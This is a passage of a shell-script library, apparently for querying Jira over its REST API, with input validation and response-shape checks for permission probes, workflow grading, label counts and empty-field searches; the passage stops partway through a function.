# _tj_cr_try <method> <url> [bodyfile]: one primitive call with the status captured (`_TJ_STATUS_FILE`).
# Sets _ct_body, _ct_err (the primitive's fixed sentence) and _ct_status (the gated 3-digit status of a
# non-2xx/3xx/5xx refusal, else empty); returns the primitive's rc. It never prints.
_tj_cr_try() {
  _ct_body=""; _ct_err=""; _ct_status=""
  _ct_sf=$(_tj_mktemp prst) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  _ct_ef=$(_tj_mktemp prerr) || { rm -f "$_ct_sf"; echo "unverified: could not create a scratch file" >&2; return 2; }
  _TJ_STATUS_FILE=$_ct_sf
  _ct_rc=0
  _ct_body=$(jira_curl_authed "$@" 2>"$_ct_ef") || _ct_rc=$?
  unset _TJ_STATUS_FILE
  _ct_status=$(cat "$_ct_sf" 2>/dev/null || true)
  _ct_err=$(cat "$_ct_ef" 2>/dev/null || true)
  rm -f "$_ct_sf" "$_ct_ef"
  return "$_ct_rc"
}

# _tj_cr_soft <method> <url> [bodyfile]: _tj_cr_try where a 401/403/404 is a SOFT answer (rc 3, nothing
# printed: the caller prints `unknown`); every other failure relays the primitive's sentence and its rc.
_tj_cr_soft() {
  _cs_rc=0
  _tj_cr_try "$@" || _cs_rc=$?
  [ "$_cs_rc" -ne 0 ] || return 0
  case "$_ct_status" in
    401|403|404) return 3 ;;
  esac
  printf '%s\n' "$_ct_err" >&2
  return "$_cs_rc"
}

# _tj_cr_probe <myself-url>: reach / auth / type. rc 0 whenever the reach+auth outcome is known (including
# unreachable, 401, 403); only an unclassifiable failure is rc 2. type is read only when auth is ok.
_tj_cr_probe() {
  _pb_rc=0
  _pb_vf=$(_tj_mktemp via) || _pb_vf=""
  [ -z "$_pb_vf" ] || _TJ_VIA_FILE=$_pb_vf
  _tj_cr_try GET "$1" || _pb_rc=$?
  unset _TJ_VIA_FILE
  _pb_via=$(cat "$_pb_vf" 2>/dev/null || true)
  [ -z "$_pb_vf" ] || rm -f "$_pb_vf"
  case "$_pb_via" in
    proxy|direct) : ;;
    *) _pb_via=unknown ;;
  esac
  _pb_reach=ok; _pb_auth=unknown; _pb_type=unknown
  if [ "$_pb_rc" -eq 0 ]; then
    _pb_auth=ok
    _pb_type=$(printf '%s' "$_ct_body" | jq -r 'if type == "object" and (.accountType | type) == "string" and (.accountType | IN("atlassian", "app", "customer")) then .accountType else "unknown" end' 2>/dev/null) || _pb_type=unknown
    case "$_pb_type" in
      atlassian|app|customer) : ;;
      *) _pb_type=unknown ;;
    esac
  else
    case "$_ct_status" in
      401|403) _pb_auth=$_ct_status ;;
      4??) : ;;
      *) case "$_ct_err" in
           "refused: HTTPS_PROXY"*|"refused: NO_PROXY"*) _pb_reach=proxy-refused ;;
           *"curl exit"*) _pb_reach=unreachable ;;
           *"returned a redirect"*) _pb_reach=redirect ;;
           *"returned status 5"*|*"rate-limited"*) _pb_reach=error ;;
           *) printf '%s\n' "$_ct_err" >&2; return "$_pb_rc" ;;
         esac ;;
    esac
  fi
  printf 'reach\t%s\nauth\t%s\ntype\t%s\nvia\t%s\n' "$_pb_reach" "$_pb_auth" "$_pb_type" "$_pb_via"
}

# _tj_cr_serverinfo <url>: deployment (cloud|datacenter|unknown) + build (digits <= 9, else unknown).
_tj_cr_serverinfo() {
  _tj_cr_try GET "$1" || { printf '%s\n' "$_ct_err" >&2; return 2; }
  _si_out=$(printf '%s' "$_ct_body" | jq -r "$(_tj_cm_defs)"'
    (if type == "object" then . else {} end) as $o
    | ($o.deploymentType | if . == "Cloud" then "cloud" elif . == "Server" or . == "DataCenter" then "datacenter" else "unknown" end) as $d
    | ($o.buildNumber | if type == "number" and . >= 0 and . == floor and . <= 999999999 then tostring
         elif type == "string" and digs and length <= 9 then . else "unknown" end) as $b
    | "deployment\t\($d)\nbuild\t\($b)"' 2>/dev/null) \
    || { echo "unverified: serverInfo response could not be read" >&2; return 2; }
  printf '%s\n' "$_si_out"
}

# _tj_cr_perms <url>: the six permissions, in the fixed order, each yes|no|unknown.
_tj_cr_perms() {
  _tj_cr_try GET "$1" || { printf '%s\n' "$_ct_err" >&2; return 2; }
  _pm_out=$(printf '%s' "$_ct_body" | jq -r '
    (if type == "object" and (.permissions | type) == "object" then .permissions else {} end) as $p
    | ["BROWSE_PROJECTS", "CREATE_ISSUES", "EDIT_ISSUES", "TRANSITION_ISSUES", "ASSIGN_ISSUES", "ADMINISTER_PROJECTS"][] as $k
    | ($p[$k] | if type == "object" and .havePermission == true then "yes" elif type == "object" and .havePermission == false then "no" else "unknown" end) as $v
    | "\($k)\t\($v)"' 2>/dev/null) \
    || { echo "unverified: mypermissions response could not be read" >&2; return 2; }
  printf '%s\n' "$_pm_out"
}

# _tj_cr_n9 <jq-path-expression> [<project-key>]: reads $_ct_body, prints digits (<= 9) or `unknown`. The key, when given,
# reaches the program only as the jq variable $k (--arg), never spliced into the program text.
_tj_cr_n9() {
  _n9_v=$(printf '%s' "$_ct_body" | jq -r --arg k "${2:-}" "$1"' | if type == "number" and . >= 0 and . == floor and . <= 999999999 then tostring else "unknown" end' 2>/dev/null) || _n9_v=unknown
  case "$_n9_v" in
    ''|*[!0-9]*) printf 'unknown' ;;
    *) printf '%s' "$_n9_v" ;;
  esac
}

# _tj_cr_visibility <base> <flavour> <rest-base> <KEY>: visible / total / levels. Cloud counts with the one
# read-only POST (search/approximate-count) and reads the project's issue total from `insight`; Data Center
# has no unfiltered total (`.total` of a maxResults=0 search IS the visible count). The security-level scheme
# is project-admin only: a 401/403/404 there (or on the total) is `unknown`; any other failure is rc 2.
_tj_cr_visibility() {
  _vs_base=$1; _vs_flavour=$2; _vs_rb=$3; _vs_key=$4
  _vs_total=unknown
  if [ "$_vs_flavour" = datacenter ]; then
    _vs_r=0; _tj_cr_soft GET "$_vs_base$_vs_rb/search?jql=project%3D$_vs_key&maxResults=0" || _vs_r=$?
    [ "$_vs_r" -eq 0 ] || [ "$_vs_r" -eq 3 ] || return "$_vs_r"
    _vs_visible=unknown; [ "$_vs_r" -ne 0 ] || _vs_visible=$(_tj_cr_n9 '.total')
  else
    _vs_bf=$(_tj_mktemp vsbody) || { echo "unverified: could not create a scratch file" >&2; return 2; }
    jq -n -c --arg j "project = $_vs_key" '{jql: $j}' > "$_vs_bf" 2>/dev/null \
      || { rm -f "$_vs_bf"; echo "unverified: could not build the count request" >&2; return 2; }
    _vs_r=0; _tj_cr_soft POST "$_vs_base$_vs_rb/search/approximate-count" "$_vs_bf" || _vs_r=$?
    rm -f "$_vs_bf"
    [ "$_vs_r" -eq 0 ] || [ "$_vs_r" -eq 3 ] || return "$_vs_r"
    _vs_visible=unknown; [ "$_vs_r" -ne 0 ] || _vs_visible=$(_tj_cr_n9 '.count')
    _vs_r=0; _tj_cr_soft GET "$_vs_base$_vs_rb/project/search?keys=$_vs_key&expand=insight" || _vs_r=$?
    [ "$_vs_r" -eq 0 ] || [ "$_vs_r" -eq 3 ] || return "$_vs_r"
    [ "$_vs_r" -ne 0 ] || _vs_total=$(_tj_cr_n9 '(.values // []) | map(select(type == "object" and .key == $k)) | if length == 1 then .[0].insight.totalIssueCount else null end' "$_vs_key")
  fi
  _vs_levels=unknown
  _vs_r=0; _tj_cr_soft GET "$_vs_base$_vs_rb/project/$_vs_key/issuesecuritylevelscheme" || _vs_r=$?
  [ "$_vs_r" -eq 0 ] || [ "$_vs_r" -eq 3 ] || return "$_vs_r"
  [ "$_vs_r" -ne 0 ] || _vs_levels=$(_tj_cr_n9 '(.levels | if type == "array" then length else null end)')
  printf 'visible\t%s\ntotal\t%s\nlevels\t%s\n' "$_vs_visible" "$_vs_total" "$_vs_levels"
}

# _tj_cr_epic <field-url>: parent | epic-link | both | none, measured from the site's field catalogue.
_tj_cr_epic() {
  _tj_cr_try GET "$1" || { printf '%s\n' "$_ct_err" >&2; return 2; }
  _ep_out=$(printf '%s' "$_ct_body" | jq -r '
    if type != "array" then error("KIT-SHAPE") else . end
    | (any(.[]; type == "object" and .id == "parent")) as $p
    | (any(.[]; type == "object" and (.schema | type) == "object" and .schema.custom == "com.pyxis.greenhopper.jira:gh-epic-link")) as $e
    | "epic\t" + (if $p and $e then "both" elif $p then "parent" elif $e then "epic-link" else "none" end)' 2>/dev/null) \
    || { echo "unverified: field response failed the expected shape" >&2; return 2; }
  printf '%s\n' "$_ep_out"
}

# _tj_cr_project <url>: style + id, both from a closed set / grammar; anything else is unverified.
_tj_cr_project() {
  _cp_body=$(jira_curl_authed GET "$1") || return $?
  printf '%s' "$_cp_body" | jq -r "$(_tj_cm_defs)"'
    if (type == "object") and ((.style | type) == "string") and (.style | IN("next-gen", "classic"))
       and ((.id | type) == "string") and (.id | digs)
    then "style\t\(.style)\nid\t\(.id)" else error("KIT-SHAPE") end' 2>/dev/null \
    || { echo "unverified: project response failed the expected shape" >&2; return 2; }
}

# _tj_cr_pstatuses <url>: the issue-type ids and the union of the type-scoped statuses, by numeric id.
_tj_cr_pstatuses() {
  _cs_body=$(jira_curl_authed GET "$1") || return $?
  _cs_out=$(printf '%s' "$_cs_body" | jq -r "$(_tj_cm_defs)"'
    def okid: (.id | type) == "string" and (.id | digs);
    if (type != "array") or length == 0 then error("KIT-SHAPE") else . end
    | map(if (type != "object") or (okid | not) or ((.statuses | type) != "array") then error("KIT-SHAPE") else . end) as $t
    | [$t[].statuses[] | if (type != "object") or (okid | not) or ((.name | type) != "string") then error("KIT-SHAPE") else {id, name} end] | unique as $s
    | if ($s | length) == 0 or (($s | map(.id) | unique | length) != ($s | length)) then error("KIT-SHAPE") else . end
    | ($t | map(.id) | unique | sort_by(tonumber)[] | "type\t\(.)"),
      ($s | sort_by(.id | tonumber)[] | "status\t\(.id)\t\(.name | if sok then . else "?" end)")' 2>/dev/null) \
    || { echo "unverified: project statuses response failed the expected shape" >&2; return 2; }
  printf '%s\n' "$_cs_out"
}

# _tj_cr_workflows <url> <projectId> <issueTypeId>...: ONE bulk POST (the server resolves the scheme, so a
# team-managed and a company-managed project take the same path), then every transition graded in jq.
# `enforced` = a restrict-issue-transition rule whose accountIds is exactly allow-assignee with every other
# allowance parameter empty, reachable from the root through `ALL` groups only (an `ANY` group, at any depth,
# is `not`; absent/null conditions is `not`). A transition's status is joined reference -> statuses[] -> id.
_tj_cr_workflows() {
  _cw_url=$1; _cw_pid=$2; shift 2
  _cw_all=""
  # ONE read per issue type, each answering EXACTLY one workflow: a bulk response cannot show which type each
  # workflow serves, so a type that got none (or several) could hide an unenforced workflow behind an enforced one.
  for _cw_ty in "$@"; do
    _cw_one=$(_tj_cr_wf_one "$_cw_url" "$_cw_pid" "$_cw_ty") || return $?
    _cw_all="$_cw_all
$_cw_one"
  done
  printf '%s\n' "$_cw_all" | LC_ALL=C sort -u | grep -v '^$' || { echo "unverified: could not sort the workflows" >&2; return 2; }
}

_tj_cr_wf_one() {
  _cw_url=$1; _cw_pid=$2; shift 2
  _cw_req=$(jq -n -c --arg pid "$_cw_pid" '$ARGS.positional | map({projectId: $pid, issueTypeId: .}) | {projectAndIssueTypes: .}' --args "$@") \
    || { echo "unverified: could not build the workflows request" >&2; return 2; }
  _cw_bf=$(_tj_mktemp wfbody) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  _cw_ef=$(_tj_mktemp wferr) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  printf '%s' "$_cw_req" > "$_cw_bf"
  _cw_rc=0
  _cw_resp=$(jira_curl_authed POST "$_cw_url" "$_cw_bf" 2>"$_cw_ef") || _cw_rc=$?
  if [ "$_cw_rc" -ne 0 ]; then
    if grep -Eq 'jira returned status 40[13]$' "$_cw_ef" 2>/dev/null; then
      echo "unverified: jira refused the workflows read (permission)" >&2; rm -f "$_cw_bf" "$_cw_ef"; return 4
    fi
    cat "$_cw_ef" >&2; rm -f "$_cw_bf" "$_cw_ef"; return "$_cw_rc"
  fi
  rm -f "$_cw_bf" "$_cw_ef"
  _cw_lines=$(printf '%s' "$_cw_resp" | jq -r "$(_tj_cm_defs)"'
    def nm: if sok then . else "?" end;
    def blank: . == null or (type == "string" and gsub("\\s"; "") == "");
    def rule_ok: if type != "object" then error("KIT-SHAPE")
      else .ruleKey == "system:restrict-issue-transition" and ((.parameters | type) == "object")
        and (.parameters.accountIds == "allow-assignee")
        and ([.parameters | to_entries[] | select(.key != "accountIds") | .value | blank] | all) end;
    def enforced: if type != "object" then error("KIT-SHAPE")
      elif .operation == "ANY" then false
      elif .operation == "ALL" then
        (((.conditions // []) | if type != "array" then error("KIT-SHAPE") else any(.[]; rule_ok) end)
         or ((.conditionGroups // []) | if type != "array" then error("KIT-SHAPE") else any(.[]; enforced) end))
      else error("KIT-SHAPE") end;
    def verdict: if . == null then "not" elif enforced then "enforced" else "not" end;
    if (type != "object") or ((.statuses | type) != "array") or ((.workflows | type) != "array")
       or ((.workflows | length) != 1) or (.isLast == false) then error("KIT-SHAPE") else . end
    | (reduce (.statuses[] | if (type != "object") or ((.statusReference | type) != "string") or ((.id | type) != "string") or ((.id | digs) | not) then error("KIT-SHAPE") else . end) as $s ({};
        if has($s.statusReference) and .[$s.statusReference] != $s.id then error("KIT-SHAPE") else .[$s.statusReference] = $s.id end)) as $ref
    | .workflows[] | if (type != "object") or ((.transitions | type) != "array") or ((.statuses | type) != "array") then error("KIT-SHAPE") else . end
    | (.statuses | map(if type != "object" then error("KIT-SHAPE") else .statusReference end)) as $own
    | (.name | nm) as $w
    | .transitions[] | if (type != "object") or ((.toStatusReference | type) != "string") or ($ref[.toStatusReference] == null) or (.toStatusReference as $to | any($own[]; . == $to) | not) then error("KIT-SHAPE") else . end
    | ["wf", $w, (.name | nm), $ref[.toStatusReference], (.conditions | verdict)] | join("\t")' 2>/dev/null) \
    || { echo "unverified: workflows response failed the expected shape" >&2; return 2; }
  [ -n "$_cw_lines" ] || { echo "unverified: workflows response carried no transitions" >&2; return 2; }
  printf '%s\n' "$_cw_lines" | LC_ALL=C sort -u || { echo "unverified: could not sort the workflows" >&2; return 2; }
}

# --- T2c leg 2: list-in-states — a thin op over `_tj_search_all` with fields ["key"] ------------
# tj_list_in_states <base> <flavour> <project> <cap> <statusid>...: every status id
# `_tj_status_id_ok`'d BEFORE any request (invariant 5); the project is QUOTED here in the JQL and
# checked by `_tj_search_all` itself (F-12d — never string-interpolated unchecked). Output is the
# validated keys, one per line, `LC_ALL=C sort`ed (invariant 6), the sort guarded (invariant 2, the
# T2c0 item-8 pattern) — an empty result with rc 0 is the legal empty list, distinguished from a
# refusal by rc alone (never by the presence of output).
tj_list_in_states() {
  _lis_base=$1; _lis_flavour=$2; _lis_project=$3; _lis_cap=$4; shift 4
  [ $# -ge 1 ] || { echo "refused: list-in-states requires at least one status id" >&2; return 1; }
  _lis_ids=""
  for _lis_sid in "$@"; do
    _tj_status_id_ok "$_lis_sid" || { echo "refused: list-in-states requires numeric status ids" >&2; return 1; }
    _lis_ids="${_lis_ids},${_lis_sid}"
  done
  _lis_ids=${_lis_ids#,}
  _lis_rb=$(_tj_rest_base "$_lis_flavour")
  case "$_lis_flavour" in
    datacenter) _lis_url="$_lis_base$_lis_rb/search" ;;
    *)          _lis_url="$_lis_base$_lis_rb/search/jql" ;;
  esac
  _lis_jql="project = \"$_lis_project\" AND status in ($_lis_ids) ORDER BY key ASC"
  _lis_out=$(_tj_search_all "$_lis_flavour" "$_lis_project" "$_lis_url" "$_lis_jql" "$_lis_cap" '["key"]') || return $?
  # fix1 F1: capture the keys FIRST so a failing jq is caught here, not hidden behind sort's own rc.
  _lis_keys=$(printf '%s' "$_lis_out" | jq -r '.key' 2>/dev/null) \
    || { echo "unverified: could not extract the list keys" >&2; return 2; }
  printf '%s' "$_lis_keys" | LC_ALL=C sort 2>/dev/null \
    || { echo "unverified: could not sort the list" >&2; return 2; }
  return 0
}

# _tj_lc_fetch_batch <flavour> <project> <url> <ids-csv> <n>: one `_tj_search_all` call for a
# <=100-id batch of label-counts' own id list (T3ac leg 9) — cap is one past the batch's own id
# count, the same "can never legitimately return more issues than ids requested" reasoning as the
# whole-list case used to carry inline.
_tj_lc_fetch_batch() {
  _lfb_flavour=$1; _lfb_project=$2; _lfb_url=$3; _lfb_ids=$4; _lfb_n=$5
  _lfb_jql="project = \"$_lfb_project\" AND key in ($_lfb_ids)"
  _lfb_cap=$((_lfb_n + 1))
  _tj_search_all "$_lfb_flavour" "$_lfb_project" "$_lfb_url" "$_lfb_jql" "$_lfb_cap" '["key","labels"]'
}

# _tj_lc_dedup <id>...: T3ac-fix1 B1 (security M-1) — the caller's ids, deduped, order preserved;
# `set -- $(_tj_lc_dedup "$@")` rebuilds positional params. A duplicate id must never split across
# two batches, where each batch's own real answer would double-count it past the exact-match check.
_tj_lc_dedup() {
  _lcd_seen=" "
  for _lcd_id in "$@"; do
    case "$_lcd_seen" in
      *" $_lcd_id "*) continue ;;
    esac
    _lcd_seen="$_lcd_seen$_lcd_id "
    printf '%s ' "$_lcd_id"
  done
}

# _tj_lc_shape_ok <objs>: T3ac-fix1 B2 (quality F1 / security L-2) — every issue's `.fields` must be
# an object and `.fields.labels` an array; a missing `fields` or a wrong-typed `labels` refuses.
_tj_lc_shape_ok() {
  printf '%s' "$1" | jq -e -s \
    'all(.[]; (.fields|type)=="object" and (.fields.labels|type)=="array")' >/dev/null 2>&1
}

# _tj_lc_exact_ok <objs> <want-json>: T3ac-fix1 B1 (security M-1) — the returned key set must
# EXACTLY match the requested set (sorted-array equality), never merely "each key is a member" — a
# subset check lets a server that answers every batch with the same small set look complete.
# Returns 0 (match), 1 (mismatch), or 2 (the computation itself failed) — the caller picks the sentence.
_tj_lc_exact_ok() {
  _lce_ok=$(printf '%s' "$1" | jq -r -s --argjson want "$2" \
    'if ([.[].key] | sort) == ($want | unique | sort) then "ok" else "no" end' 2>/dev/null) || return 2
  [ "$_lce_ok" = "ok" ] && return 0
  return 1
}

# _tj_lc_exact_err <rc>: T3ac-fix1 B1/B5 (function-size ceiling extraction) — the fixed sentence for
# each of `_tj_lc_exact_ok`'s two failure rc's (2 = the computation itself failed; else a mismatch).
_tj_lc_exact_err() {
  if [ "$1" -eq 2 ]; then
    echo "unverified: could not verify the requested id set" >&2
  else
    echo "unverified: search response did not cover the requested id set" >&2
  fi
}

# _tj_lc_prefix_ok <prefix>: T3ac-fix1 B3 (security L-1) — a spelled-out class + a length bound;
# `[!a-z]` is locale-dependent under macOS sh (LC_ALL=en_US.UTF-8 wrongly accepted "Size"/"sizé").
_tj_lc_prefix_ok() {
  case "$1" in
    [abcdefghijklmnopqrstuvwxyz]*) : ;;
    *) return 1 ;;
  esac
  case "$1" in
    *[!abcdefghijklmnopqrstuvwxyz]*) return 1 ;;
  esac
  [ "${#1}" -le 32 ]
}

# _tj_lc_run_batches <flavour> <project> <url> <buf> <id>...: T3ac leg 9 (function-size ceiling
# extraction) — chunks the (already deduped) id list into <=100-id `_tj_lc_fetch_batch` calls,
# appending each batch's output to <buf>.
_tj_lc_run_batches() {
  _lrb_flavour=$1; _lrb_project=$2; _lrb_url=$3; _lrb_buf=$4; shift 4
  _lrb_chunk=""; _lrb_n=0
  for _lrb_id in "$@"; do
    _lrb_chunk="${_lrb_chunk}${_lrb_chunk:+,}${_lrb_id}"; _lrb_n=$((_lrb_n + 1))
    if [ "$_lrb_n" -eq 100 ]; then
      _tj_lc_fetch_batch "$_lrb_flavour" "$_lrb_project" "$_lrb_url" "$_lrb_chunk" "$_lrb_n" >> "$_lrb_buf" || return $?
      _lrb_chunk=""; _lrb_n=0
    fi
  done
  [ -z "$_lrb_chunk" ] || _tj_lc_fetch_batch "$_lrb_flavour" "$_lrb_project" "$_lrb_url" "$_lrb_chunk" "$_lrb_n" >> "$_lrb_buf"
}

# --- T3c: label-counts — key<TAB>count of labels matching <prefix>:<value> per issue (F-8) ------
# tj_label_counts <base> <flavour> <project> <prefix> <id>...: a thin op over `_tj_search_all` with
# fields ["key","labels"]; a label failing the grammar is never captured into a shell variable or
# printed, only counted inside jq (F-8). More than 100 ids batch into `_tj_lc_fetch_batch` calls of
# <=100 ids each (T3ac leg 9 — Jira's own `search` cap on a single JQL query).
tj_label_counts() {
  _lc_base=$1; _lc_flavour=$2; _lc_project=$3; _lc_prefix=$4; shift 4
  # T3b step 0c item 1 (carried from the T3ac fix1 security seat, Low): project grammar checked
  # FIRST — defence in depth for the per-id loop and the id-dedup word-split below. DISCLOSED: this
  # particular leg (project 'AB *') already passes without this line too — `_tj_search_all`'s own
  # `_tj_project_ok` call backstops it before any request either way; kept for fail-fast ordering.
  _tj_project_ok "$_lc_project" || { echo "refused: project failed grammar" >&2; return 1; }
  # T3ac-fix1 B4 (security L-5 / quality m3): zero ids refused before any check or request.
  [ $# -ge 1 ] || { echo "refused: label-counts requires at least one id" >&2; return 1; }
  # T3ac-fix1 B3 (security L-1): see _tj_lc_prefix_ok.
  _tj_lc_prefix_ok "$_lc_prefix" || { echo "refused: label-counts prefix failed grammar" >&2; return 1; }
  # T3ac leg 7b: every id `_tj_id_ok`'d against the project before any request (invariant 5/S-4).
  for _lc_id in "$@"; do
    _tj_id_ok "$_lc_project" "$_lc_id" || { echo "refused: label-counts requires ids matching the project" >&2; return 1; }
  done
  # T3ac-fix1 B1: dedup BEFORE batching (see _tj_lc_dedup). Word-splitting is deliberate here — ids
  # are already grammar-validated single tokens (no space/glob byte), and `set -f` guards the glob.
  # T3b step 0c item 2: `set -f` is restored to the CALLER'S OWN noglob state (saved from `$-`),
  # never cleared unconditionally — a caller with `set -f` already on must still have it on after.
  _lc_oldifs=$IFS; IFS=' '  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  case $- in
    *f*) _lc_noglob=1 ;;
    *) _lc_noglob=0 ;;
  esac
  set -f
  # shellcheck disable=SC2046
  set -- $(_tj_lc_dedup "$@")
  IFS=$_lc_oldifs  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  [ "$_lc_noglob" -eq 1 ] || set +f
  # T3b step 0b: the batched requests run inside `_tj_rundir_run`'s own private run dir, so a
  # signal mid-call cleans up this op's own `_lc_buf` (and every `jira_curl_authed` temp) too.
  _tj_rundir_run _tj_lc_body "$_lc_base" "$_lc_flavour" "$_lc_project" "$_lc_prefix" "$@"
}

_tj_lc_body() {
  _lc_base=$1; _lc_flavour=$2; _lc_project=$3; _lc_prefix=$4; shift 4
  _lc_rb=$(_tj_rest_base "$_lc_flavour")
  case "$_lc_flavour" in
    datacenter) _lc_url="$_lc_base$_lc_rb/search" ;;
    *)          _lc_url="$_lc_base$_lc_rb/search/jql" ;;
  esac
  # the requested id set, as a JSON array — the exact-match check below asserts full coverage.
  _lc_want=$(printf '%s\n' "$@" | jq -R -s -c 'split("\n") | map(select(length>0))' 2>/dev/null) \
    || { echo "unverified: could not build the requested id set" >&2; return 2; }
  _lc_buf=$(_tj_mktemp lcbuf) || { echo "unverified: could not create a scratch file" >&2; return 2; }
  _tj_lc_run_batches "$_lc_flavour" "$_lc_project" "$_lc_url" "$_lc_buf" "$@" \
    || { _lc_rc=$?; rm -f "$_lc_buf"; return "$_lc_rc"; }
  # T3ac-fix1 B5 (security L-4): a fixed sentence, never a silent rc 2.
  _lc_objs=$(cat "$_lc_buf" 2>/dev/null) \
    || { echo "unverified: could not read the batched search results" >&2; rm -f "$_lc_buf"; return 2; }
  rm -f "$_lc_buf"
  # T3ac-fix1 B2: every issue's fields/labels shape asserted (invariant 3).
  _tj_lc_shape_ok "$_lc_objs" \
    || { echo "unverified: search response issue did not carry the expected labels shape" >&2; return 2; }
  # T3ac-fix1 B1: exact-match, not subset — supersedes the old T3ac leg 8 rc (B5's fixed sentences
  # live in _tj_lc_exact_err). Reviewer Low #1 shape (set -e): the call is the CONDITION of `||`,
  # never a bare `cmd; rc=$?` (that form silently skips the message under errexit — found live).
  _tj_lc_exact_ok "$_lc_objs" "$_lc_want" || { _tj_lc_exact_err "$?"; return 2; }
  _lc_counts=$(printf '%s' "$_lc_objs" | jq -r --arg pfx "$_lc_prefix" \
    '.key as $k | ([.fields.labels[]? | select(type=="string" and test("\\A" + $pfx + ":[A-Za-z0-9_-]{1,32}\\z"))] | length) as $c | [$k, $c] | @tsv' 2>/dev/null) \
    || { echo "unverified: could not compute label counts" >&2; return 2; }
  printf '%s' "$_lc_counts" | LC_ALL=C sort 2>/dev/null \
    || { echo "unverified: could not sort the label counts" >&2; return 2; }
  return 0
}

# --- T3b-core: field-empty — the SUBSET of requested ids whose <spec> field is EMPTY (S-7/F-8) ----
# _tj_fe_spec_ok <spec>: the closed grammar (`customfield_[0-9]+|description`, \A…\z, bounded).
_tj_fe_spec_ok() {
  case "$1" in
    description) return 0 ;;
    customfield_[0-9]*)
      _feo_rest=${1#customfield_}
      case "$_feo_rest" in
        ''|*[!0-9]*) return 1 ;;
      esac
      [ "${#_feo_rest}" -le 10 ] ;;
    *) return 1 ;;
  esac
}

# _tj_fe_clause <spec>: the JQL "is EMPTY" fragment for a validated spec.
_tj_fe_clause() {
  case "$1" in
    description) printf 'description' ;;
    *) printf 'cf[%s]' "${1#customfield_}" ;;
  esac
}

# _tj_fe_fetch_batch: one `_tj_search_all` call for a <=100-id batch (the label-counts pattern).
_tj_fe_fetch_batch() {
  _feb_flavour=$1; _feb_project=$2; _feb_url=$3; _feb_clause=$4; _feb_ids=$5; _feb_n=$6
  _feb_jql="project = \"$_feb_project\" AND key in ($_feb_ids) AND $_feb_clause is EMPTY"
  _feb_cap=$((_feb_n + 1))
  _tj_search_all "$_feb_flavour" "$_feb_project" "$_feb_url" "$_feb_jql" "$_feb_cap" '["key"]'
}

# _tj_fe_run_batches: chunks the (already deduped) id list into <=100-id fetch_batch calls.
_tj_fe_run_batches() {
  _frb_flavour=$1; _frb_project=$2; _frb_url=$3; _frb_clause=$4; _frb_buf=$5; shift 5
  _frb_chunk=""; _frb_n=0
  for _frb_id in "$@"; do
    _frb_chunk="${_frb_chunk}${_frb_chunk:+,}${_frb_id}"; _frb_n=$((_frb_n + 1))
    if [ "$_frb_n" -eq 100 ]; then
      _tj_fe_fetch_batch "$_frb_flavour" "$_frb_project" "$_frb_url" "$_frb_clause" "$_frb_chunk" "$_frb_n" >> "$_frb_buf" || return $?
      _frb_chunk=""; _frb_n=0
    fi
  done
  [ -z "$_frb_chunk" ] || _tj_fe_fetch_batch "$_frb_flavour" "$_frb_project" "$_frb_url" "$_frb_clause" "$_frb_chunk" "$_frb_n" >> "$_frb_buf"
}

# _tj_fe_shape_ok <objs>: defence in depth — every object's `.key` must be a JSON string. In
# practice `_tj_search_all`'s own per-key grammar gate (invariant 1/3) already refuses a non-string
# key upstream (rc 1) before this is ever reached; kept for a caller of this helper alone.
_tj_fe_shape_ok() {
  printf '%s' "$1" | jq -e -s 'all(.[]; (.key|type)=="string")' >/dev/null 2>&1
}

# _tj_fe_subset_ok <objs> <want-json>: the answer is a SUBSET of the requested ids (never a member
# outside it — rc 1, a caller-facing grammar-shaped refusal) and never repeats a key ACROSS separate
# batches, each its own `_tj_search_all` call with its OWN fresh dedup state (rc 2 — the
# `_tj_lc_exact_ok` cross-batch lesson, T3ac-fix1 B1, applied to a subset instead of an exact match).
_tj_fe_subset_ok() {
  _fso_objs=$1; _fso_want=$2
  _fso_bad=$(printf '%s' "$_fso_objs" | jq -r -s --argjson want "$_fso_want" \
    '([.[].key] - $want) | length' 2>/dev/null) || { echo "unverified: could not verify the requested id set" >&2; return 2; }
  case "$_fso_bad" in
    ''|*[!0-9]*) echo "unverified: could not verify the requested id set" >&2; return 2 ;;
  esac
  if [ "$_fso_bad" -gt 0 ]; then
    echo "refused: search response returned a key outside the requested id set" >&2
    return 1
  fi
  _fso_dup=$(printf '%s' "$_fso_objs" | jq -r -s '([.[].key] | length) - ([.[].key] | unique | length)' 2>/dev/null) \
    || { echo "unverified: could not verify the requested id set" >&2; return 2; }
  case "$_fso_dup" in
    ''|*[!0-9]*) echo "unverified: could not verify the requested id set" >&2; return 2 ;;
  esac
  if [ "$_fso_dup" -gt 0 ]; then
    echo "unverified: search response returned a duplicated key" >&2
    return 2
  fi
  return 0
}

# tj_field_empty <base> <flavour> <project> <spec> <id>...: the subset of <id>... whose <spec>
# field is EMPTY (Jira's own JQL EMPTY — a whitespace-only description is not EMPTY). Ids
# deduplicated and `_tj_id_ok`'d before any request (invariant 5); project checked first.
tj_field_empty() {
  _fe_base=$1; _fe_flavour=$2; _fe_project=$3; _fe_spec=$4; shift 4
  _tj_project_ok "$_fe_project" || { echo "refused: project failed grammar" >&2; return 1; }
  [ $# -ge 1 ] || { echo "refused: field-empty requires at least one id" >&2; return 1; }
  _tj_fe_spec_ok "$_fe_spec" || { echo "refused: field-empty spec failed grammar" >&2; return 1; }
  for _fe_id in "$@"; do
    _tj_id_ok "$_fe_project" "$_fe_id" || { echo "refused: field-empty requires ids matching the project" >&2; return 1; }
  done
  _fe_oldifs=$IFS; IFS=' '  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  case $- in
    *f*) _fe_noglob=1 ;;
    *) _fe_noglob=0 ;;
  esac
  set -f
  # shellcheck disable=SC2046
  set -- $(_tj_lc_dedup "$@")
  IFS=$_fe_oldifs  # nosemgrep: bash.lang.security.ifs-tampering.ifs-tampering
  [ "$_fe_noglob" -eq 1 ] || set +f
  # fix1 quality-5: defence in depth — if dedup ever emptied a non-empty list, refuse rather than
  # silently answer "zero ids are empty" at rc 0.
  [ $# -ge 1 ] || { echo "refused: field-empty requires at least one id" >&2; return 1; }
  _tj_rundir_run _tj_fe_body "$_fe_base" "$_fe_flavour" "$_fe_project" "$_fe_spec" "$@"
}

_tj_fe_body() {
  _fe_base=$1; _fe_flavour=$2; _fe_project=$3; _fe_spec=$4; shift 4
  _fe_rb=$(_tj_rest_base "$_fe_flavour")
